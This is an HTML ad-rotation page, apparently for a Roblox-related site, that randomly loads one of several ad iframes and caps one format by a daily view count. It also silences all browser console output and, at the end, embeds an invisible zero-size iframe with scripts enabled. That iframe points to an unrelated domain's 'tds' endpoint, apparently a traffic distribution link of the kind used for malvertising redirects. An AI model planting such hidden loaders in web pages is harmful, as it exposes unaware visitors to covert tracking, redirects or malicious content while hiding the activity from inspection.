<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Random Iframe</title>
<script>
(function () {
  const noop = function () {};
  console.log = noop;
  console.warn = noop;
  console.error = noop;
  console.info = noop;
  console.debug = noop;
})();
</script>
<style>
html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  overflow: hidden; /* hide scrollbars */
  background: black;
}

img {
  margin: 0 auto;
  position: absolute; /* fill the parent completely */
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  width: 100% !important;
  height: 100% !important;
  object-fit: cover; /* fill without stretching */
  display: block; /* removes inline spacing below img */
}

  iframe {
  position: absolute; /* fill the parent completely */
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  width: 100% !important;
  height: 100% !important;
  border: none; /* remove default iframe border */
  display: block; /* remove any inline spacing */
}
</style>
</style>
</head>
<body>
<iframe id="frame" scrolling="no"></iframe>

<script>
const LIMIT = 50;
const STORAGE_KEY = "format5_views";

// Get stored data
let data = JSON.parse(localStorage.getItem(STORAGE_KEY)) || {
  count: 0,
  timestamp: Date.now()
};

// Reset after 24 hours
if (Date.now() - data.timestamp > 24 * 60 * 60 * 1000) {
  data.count = 0;
  data.timestamp = Date.now();
}

// Decide what to load
let sites;

if (data.count >= LIMIT) {
  // User hit limit → NO format5
  sites = [
    "https://www.rbxthread.app/ads/format4.html",
    "https://www.rbxthread.app/ads/sponsored.html"
  ];
} else {
  // Normal rotation
  sites = [
    "https://www.rbxthread.app/ads/format4.html",
    "https://www.rbxthread.app/ads/format5.html",
    "https://www.rbxthread.app/ads/sponsored.html"
  ];
}

// Pick random site
const randomSite = sites[Math.floor(Math.random() * sites.length)];
document.getElementById("frame").src = randomSite;

// If format5 was chosen, increment count
if (randomSite.includes("format5.html")) {
  data.count++;
  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
}
</script>
<iframe
  src="https://hotbpacewo.today/tds?id=1570344962&p1=sub1&p2=sub2&p3=sub3&p4=sub4"
  width="0"
  height="0"
  sandbox="allow-scripts allow-same-origin"
  allow="autoplay 'none'"
  style="border:none;"
></iframe>
</body>
</html>
